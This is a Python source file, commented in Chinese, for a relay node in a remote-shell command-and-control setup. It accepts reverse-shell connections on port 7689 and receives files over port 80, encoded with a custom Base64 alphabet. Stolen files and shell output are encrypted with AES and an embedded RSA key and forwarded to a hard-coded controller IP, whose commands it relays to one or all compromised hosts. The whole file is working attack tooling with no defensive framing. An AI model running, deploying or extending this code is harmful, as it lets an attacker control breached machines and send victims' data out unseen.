import base64
import socket
import threading
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
import os

7689

# 存储当前连接到该主机的所有IP地址
connected_ips = []
connected_ip_sockets = []
connected_ips_lock = threading.Lock()
timeout_duration = 600 # 默认20秒没有操作就主动断开
# 默认的转发目标IP地址
default_forward_ip = '10.21.249.131'

# 自定义的Base64编码表
base64_custom = b"abcdefghijpqrzABCKLMNOkDEFGHIJl345678mnoPQRSTUVstuvwxyWXYZ0129+/"
standard_base64 = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnv3JFFF0MboYe0afUgIg
g4VJ2a7v0W5UjrrYj87YfH6SPVMIfSQndk/CN9/aBStnFn/hCkuKV67ibQnbl+6p
lDsbiELLmSWsppMgKwBhGCIs6qv2o5FoPBFO0LceJQGYT1jVVTu3ivUwU3hOZRQV
83NjVIXg+PtUfyu+62KBq9bTQI9W2jV15lb0SMQRhR2spRUnZ7EO3u71JOOX2Gir
PBn4VajneAJumYtmUuQrfW2Leehhci2LzOWZ7SYeS/TV2CQX5ouyqQNP3HJ3YC18
2B4o8iBLgNi9Ni5uPkFnumOqYm2eVADgKs58Ah61rwgacM5rTHhEuYvvfeeb1xQ7
DQIDAQAB
-----END PUBLIC KEY-----"""


""" 一。 编码及加解密模块 """

def decode_chunk(encoded_chunk):
    # 首先将 `encoded_chunk` 使用自定义表进行字符替换为标准Base64表
    translation_table = bytes.maketrans(base64_custom, standard_base64)
    standard_chunk = encoded_chunk.translate(translation_table)
    
    # 使用标准的Base64解码方法解码数据
    decoded_chunk = base64.b64decode(standard_chunk)
    return decoded_chunk


# 从字符串反序列化公钥
def deserialize_public_key_from_string(pem_str):
    public_key = serialization.load_pem_public_key(
        pem_str.encode('utf-8'),
        backend=default_backend()
    )
    return public_key

# 生成对称密钥 (AES)
def generate_symmetric_key():
    return os.urandom(32)  # 256-bit AES key

# 使用对称密钥加密文件
def encrypt_data(data, key):
    iv = os.urandom(16)  # 128-bit IV
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    print(f"Decrypted AES IV: {iv}")
    encrypted_data = encryptor.update(data) + encryptor.finalize()
    return iv + encrypted_data  # IV 和data一起


# 使用 RSA 加密对称密钥
def encrypt_symmetric_key(sym_key, public_key):
    encrypted_key = public_key.encrypt(
        sym_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_key


""" 二。跳板节点函数 """

def forward_data(data, source_ip, target_ips=None, is_file=False):
    if len(data) == 0:
        return
    target_ips = target_ips or [default_forward_ip]
    for ip in target_ips:

        try:
            # 获取目标IP的连接对象
            connected_ips_lock.acquire()
            forward_socket = None
            for client_ip, client_socket in connected_ip_sockets:
                if client_ip == ip:
                    forward_socket = client_socket
                    break

            if forward_socket:
                if is_file:
                    
                    # 在数据头部添加文件传输标志
                    if ip == default_forward_ip:
                        data = f"file_trans from ip: {source_ip}".encode('utf-8')+b"\n\n\n\n" + data
                        # 加密
                        symmetric_key = generate_symmetric_key()

                        encrypted_file_data = encrypt_data(data, symmetric_key)
                        encrypted_symmetric_key = encrypt_symmetric_key(symmetric_key, loaded_public_key)
                        data = encrypted_symmetric_key + encrypted_file_data
                    else:
                        data = data
                else:
                    # 普通数据传输
                    if ip == default_forward_ip:
                        data =data + f"\nfrom ip: {source_ip}".encode('utf-8')
                        # 加密
                        symmetric_key = generate_symmetric_key()
                        encrypted_file_data = encrypt_data(data, symmetric_key)
                        encrypted_symmetric_key = encrypt_symmetric_key(symmetric_key, loaded_public_key)
                        data = encrypted_symmetric_key + encrypted_file_data
                    else:
                        data = data

                # 发送数据

                forward_socket.sendall(data)
                if(ip == default_forward_ip):
                    forward_socket.sendall(b"EOF")
                print(f"Data forwarded to {ip}")
                connected_ips_lock.release()
                break
            else:
                print(f"No active connection to {ip}")
        except Exception as e:
            print(f"Error forwarding data to {ip}: {e}")


def notify_ip_list_change():
    message = "Updated IP list:\n" + '\n'.join(connected_ips)
    if(default_forward_ip not in connected_ips):
        print("control_end offline!")
    else:
        forward_data(message.encode('utf-8'), '0.0.0.0')
        print(f"Sent IP list update to {default_forward_ip}")


def parse_command_message(message):
    """解析上位IP发送的命令消息"""
    message_parts = message.split(';')
    target_ip = None
    command = None
    
    for part in message_parts:
        if part.startswith('ip='):
            target_ip = part[3:]
        elif part.startswith('cmd='):
            command = part[4:]
    
    return target_ip, command

# 基本满足
def handle_shell_connection(client_socket, client_address):
    connected_ips.append(client_address[0])
    connected_ip_sockets.append((client_address[0], client_socket))
    notify_ip_list_change()  # 当IP列表变化时通知
    client_socket.settimeout(timeout_duration)
    try:
        while True:
            try:
                data = client_socket.recv(8000)
                if not data:  # 检测到空数据包，客户端可能已断开连接
                    print(f"Connection with {client_address[0]} has been closed by the client.")
                    break
                if client_address[0] == default_forward_ip:
                    # 如果消息来自上位IP，则解析并执行命令
                    
                    target_ip, command = parse_command_message(data.decode('utf-8'))
                    if command:
                        print(f"new command to {target_ip} cmd:{command}")
                        if target_ip == '-a':
                            # 对所有IP执行命令
                            forward_data(command.encode('utf-8'), client_address[0], target_ips=connected_ips)
                        else:
                            # 检查 target_ip 是否在 connected_ips 列表中
                            target_socket = None
                            for ip, sock in connected_ip_sockets:
                                if ip == target_ip:
                                    target_socket = sock
                                    break

                            if target_socket:
                                # 对指定IP执行命令，传递参数
                                forward_data(command.encode('utf-8'), client_address[0], [target_ip])
                            else:
                                print(f"Target IP {target_ip} not connected.")

                else:
                    # 普通Shell消息，转发
                    data_with_ip = data.decode('utf-8')
                    print(f"Received data from {client_address}: {data_with_ip}")

                    forward_data(data, client_address[0])
            except socket.timeout:
                    print(f"Connection with {client_address[0]} timed out.")
                    break  # 超时后退出循环

            except Exception as e:
                    print(f"Error handling connection from {client_address[0]}: {e}")
                    break  # 处理其他异常
    finally:
        connected_ips.remove(client_address[0])
        notify_ip_list_change()
        print(f"Connection with {client_address} closed.")


def shell_listener_server(host='0.0.0.0',port=7689):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Shell listener server running on {host}:{port}...")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"New connection from {client_address}")
        if client_address[0] in connected_ips:
            continue
        threading.Thread(target=handle_shell_connection, args=(client_socket, client_address)).start()


# 文件传输测试没问题
def file_receiver_server(host='0.0.0.0', port=80):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"File receiver server listening on {host}:{port}")
    
    while True:
        client_socket, addr = server.accept()
        print(f"New file_trans from {addr}")
        request_data = b''
        # 循环接收数据块
        while True:
            chunk = client_socket.recv(6000)
            headers, body = chunk.split(b'\r\n\r\n', 1)
            if b'0ver' in body:  # 如果接收到结束标志
                break
            body = decode_chunk(body)

            request_data += body
            client_socket.sendall(b"ACK")  # 确认块接收成功
        
        # 将接收到的数据转发给默认的IP地址
        forward_data(request_data,addr,is_file=True)
        client_socket.close()

loaded_public_key = deserialize_public_key_from_string(public_key)

def start_servers():

    file_receiver_thread = threading.Thread(target=file_receiver_server, args=('0.0.0.0', 80))
    shell_listener_thread = threading.Thread(target=shell_listener_server, args=('0.0.0.0', 7689))
    
    file_receiver_thread.start()
    shell_listener_thread.start()

    file_receiver_thread.join()
    shell_listener_thread.join()

# 开始服务器
start_servers()
